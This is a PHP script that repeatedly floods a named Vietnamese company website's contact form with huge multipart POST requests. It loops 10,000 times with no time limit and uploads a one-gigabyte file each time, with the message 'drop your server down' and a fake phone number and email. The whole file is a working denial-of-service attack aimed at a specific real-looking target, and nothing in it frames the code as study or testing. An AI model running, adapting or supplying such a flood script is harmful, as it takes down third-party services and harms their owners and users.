<?php

    // 10GB Each
    $run_time = 10000; // 100MB each file
    set_time_limit(0);

    function build_data_files($boundary, $fields, $files){
        $data = '';
        $eol = "\r\n";

        $delimiter = '-------------' . $boundary;

        foreach ($fields as $name => $content) {
            $data .= "--" . $delimiter . $eol
                . 'Content-Disposition: form-data; name="' . $name . "\"".$eol.$eol
                . $content . $eol;
        }


        foreach ($files as $name => $content) {
            $data .= "--" . $delimiter . $eol
                . 'Content-Disposition: form-data; name="' . $name . '"; filename="' . $name . '"' . $eol
                //. 'Content-Type: image/png'.$eol
                . 'Content-Transfer-Encoding: binary'.$eol
                ;

            $data .= $eol;
            $data .= $content . $eol;
        }
        $data .= "--" . $delimiter . "--".$eol;


        return $data;
    }

    for ($i = 0; $i < $run_time; $i++) {
        $filenames = [__DIR__."/1gb.txt"];

        // data fields for POST request
        $fields = [
            "ten" => "test",
            "dienthoai" => "0772848291",
            "diachi" => "test",
            "email" => "test@gmail.com",
            "tieude" => "Test",
            "noidung" => "drop your server down",
            "file" => file_get_contents($filenames[0]),
            "submit-contact" => "Gửi",
            "recaptcha_response_contact" => "",
        ];
        

        // files to upload

        $files = array();
        foreach ($filenames as $f){
            $files[$f] = file_get_contents($f);
        }

        // URL to upload to
        $url = "https://phankhoilon.com.vn/lien-he";

        // curl

        $curl = curl_init();

        // $url_data = http_build_query($fields);

        $boundary = uniqid();
        $delimiter = '-------------' . $boundary;

        $post_data = build_data_files($boundary, $fields, $files);


        curl_setopt_array($curl, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 30,
            //CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $post_data,
            CURLOPT_CONNECTTIMEOUT => 0,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_HTTPHEADER => array(
                //"Authorization: Bearer $TOKEN",
                "Content-Type: multipart/form-data; boundary=" . $delimiter,
                "Content-Length: " . strlen($post_data)
            ),
        ));

        //
        $response = curl_exec($curl);

        $info = curl_getinfo($curl);
        //echo "code: ${info['http_code']}";

        // print_r($info['request_header']);

        var_dump($response);
        $err = curl_error($curl);

        echo "error";
        var_dump($err);
        curl_close($curl);
        
    }
